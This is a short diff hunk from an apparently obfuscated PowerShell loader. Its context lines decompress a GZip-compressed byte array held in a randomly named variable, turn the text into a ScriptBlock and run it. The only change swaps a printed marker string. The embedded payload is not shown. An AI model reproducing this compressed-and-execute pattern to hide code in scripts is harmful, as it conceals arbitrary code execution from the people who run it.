@@ -540,6 +540,6 @@ $ms2 = New-Object System.IO.MemoryStream(,$OnDsgYhakB)
 $gz2 = New-Object System.IO.Compression.GZipStream($ms2,[System.IO.Compression.CompressionMode]::Decompress)
 $src = (New-Object System.IO.StreamReader($gz2)).ReadToEnd()
 $gz2.Close(); $ms2.Close()
-Write-Host 'zBringerCode_' -ForegroundColor DarkGray
+Write-Host 'yorsh' -ForegroundColor DarkGray
 $wGxEvMbbCQ = [ScriptBlock]::Create($src)
 & $wGxEvMbbCQ @args
